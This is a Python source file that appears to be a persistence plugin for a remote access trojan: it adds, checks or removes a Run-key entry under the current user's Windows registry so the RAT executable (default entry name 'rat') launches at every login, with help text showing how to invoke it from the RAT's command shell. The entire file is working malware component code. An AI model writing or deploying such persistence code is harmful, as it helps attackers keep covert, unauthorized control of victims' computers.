import winreg

from core.utils.client_util import get_executable_path

DEFAULT_NAME = 'rat'
EXECUTABLE_PATH = get_executable_path()
KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'


def registry(action, name):
    if action == 'help':
        print('\n' + '=' * 50)
        print('Registry Persistence Script')
        print('=' * 50)
        print('\nUsage:')
        print('  --action create               Create registry key (default name: rat)')
        print('  --action delete               Delete registry key (default name: rat)')
        print('  --action query                Check if registry key exists (default name: rat)')
        print('  --action query --name MyApp   Check specific registry key')
        print('  --action create --name MyApp  Create with custom name')
        print('  --action delete --name MyApp  Delete with custom name')
        print('\nExamples:')
        print('  exec win/persist/registry.py --action create')
        print('  exec win/persist/registry.py --action query --name MyApp')
        print('  exec win/persist/registry.py --action delete --name MyApp')
        print('=' * 50)
        return

    if action == 'query':
        # 检查指定项是否存在
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_PATH, 0, winreg.KEY_READ)
            try:
                value, _ = winreg.QueryValueEx(key, name)
                print(f'✓ Registry key "{name}" exists')
                print(f'  Path: {value}')
            except FileNotFoundError:
                print(f'✗ Registry key "{name}" does not exist')
            finally:
                winreg.CloseKey(key)
        except Exception as e:
            print(f'Error: {e}')
        return

    # 打开注册表键
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_PATH, 0, winreg.KEY_WRITE)

    try:
        if action == 'delete':
            try:
                winreg.DeleteValue(key, name)
                print(f'✓ Registry key "{name}" removed')
            except FileNotFoundError:
                print(f'✗ Registry key "{name}" not found')
        elif action == 'create':
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, EXECUTABLE_PATH)
            print(f'✓ Registry key "{name}" created')
            print(f'  Path: {EXECUTABLE_PATH}')
        else:
            print(f'Unknown action: {action}')
    finally:
        winreg.CloseKey(key)


action = kwargs.get('action', 'help')
name = kwargs.get('name', DEFAULT_NAME)
registry(action=action, name=name)
